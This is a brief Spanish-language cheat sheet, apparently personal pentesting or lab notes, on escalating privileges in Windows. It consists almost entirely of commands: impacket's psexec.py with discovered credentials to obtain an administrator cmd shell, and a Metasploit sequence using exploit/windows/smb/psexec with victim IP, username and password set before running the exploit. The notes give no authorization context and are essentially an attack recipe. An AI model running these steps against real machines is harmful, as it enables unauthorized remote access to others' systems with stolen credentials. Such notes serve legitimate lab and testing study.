# Escalación de privilegios en Windows

Tags: #Windows #PrivEsc #Meterpreter

## Escalación de privilegios 

```bash 
# Si en el escaneo anterior encontramos 'user:passwd' podemos hacer lo siguiente si tenemos el puerto 135 abierto:

❯ psexec.py administrator@IP        # Nos da una cmd en Windows
	# user = Administrator
	# IP = Direccion de la maquina victima
```

## Con Meterpreter 

```bash 
# Si en el escaneo anterior encontramos 'user:passwd' podemos hacer lo siguiente con Meterpreter si tenemos el puerto 135 abierto:

❯ sessions <ID>                                    # Regresas a la sesión de Meterpreter que tenias 

❯ background                                       # Colocamos la sesion en segundo plano 
	❯ search psexec                               # Conectarse a la consola de Windows 
	❯ use exploit/windows/smb/psexec           
	❯ options 
	❯ set LPORT 4422                              # Colocamos un puerto que no estemos ocupando 
	❯ set RHOSTS <IP>                             # Colocamos la IP de la maquina victima 
	❯ set SMBUser <Username>                      # Agregamos el usuario
	❯ set SMBPass <Passwd>                        # Colocamos la contraseña del usuario 
	❯ exploit 
```